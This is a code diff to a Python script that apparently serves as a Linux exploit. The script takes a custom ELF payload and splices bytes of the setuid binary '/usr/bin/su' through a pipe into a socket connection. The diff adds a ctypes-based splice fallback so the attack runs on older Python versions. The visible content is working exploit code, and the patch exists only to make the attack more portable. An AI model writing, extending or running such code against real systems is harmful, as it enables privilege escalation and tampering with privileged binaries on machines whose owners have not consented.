@@ -1,4 +1,5 @@
 import os
+import ctypes
 import socket
 import sys
 import errno
@@ -10,6 +11,41 @@ if len(sys.argv) == 2: # custom payload is specified
     with open(sys.argv[1], 'rb') as elf: # read bytes of ELF
         payload = elf.read()
         print(f"Read in custom payload with size = {len(payload)} bytes")
+        
+# pre-3.10 way of calling os.splice(...)
+SPLICE_F_MORE = 4
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+libc.splice.restype = ctypes.c_ssize_t
+libc.splice.argtypes = [
+    ctypes.c_int,
+    ctypes.POINTER(ctypes.c_int64),
+    ctypes.c_int,
+    ctypes.POINTER(ctypes.c_int64),
+    ctypes.c_size_t,
+    ctypes.c_uint,
+]
+
+
+def splice(f, w, o, offset_src=None, offset_dst=None, flags=SPLICE_F_MORE):
+    if offset_src is not None:
+        c_off_in = ctypes.c_int64(offset_src)
+        p_off_in = ctypes.byref(c_off_in)
+    else:
+        p_off_in = None
+
+    if offset_dst is not None:
+        c_off_out = ctypes.c_int64(offset_dst)
+        p_off_out = ctypes.byref(c_off_out)
+    else:
+        p_off_out = None
+
+    ret = libc.splice(f, p_off_in, w, p_off_out, o, flags)
+
+    if ret == -1:
+        errno = ctypes.get_errno()
+        raise OSError(errno, os.strerror(errno))
+
+    return ret
 
 
 def send(fd, offset, chunk): 
@@ -26,9 +62,9 @@ def send(fd, offset, chunk):
     print("Creating pipe...")
     rd, wr = os.pipe()
 
-    os.splice(fd, wr, offset + 4, offset_src=0)
+    os.splice(fd, wr, offset + 4, offset_src=0) if sys.version_info >= (3, 10) else splice(fd, wr, offset + 4, offset_src=0)
     print(f"'/usr/bin/su' -> pipe: {offset + 4} B xfered")
-    os.splice(rd, conn.fileno(), offset + 4)
+    os.splice(rd, conn.fileno(), offset + 4) if sys.version_info >= (3, 10) else splice(rd, conn.fileno(), offset + 4)
     print(f"pipe -> connection: {offset + 4} B xfered")
 
     try:
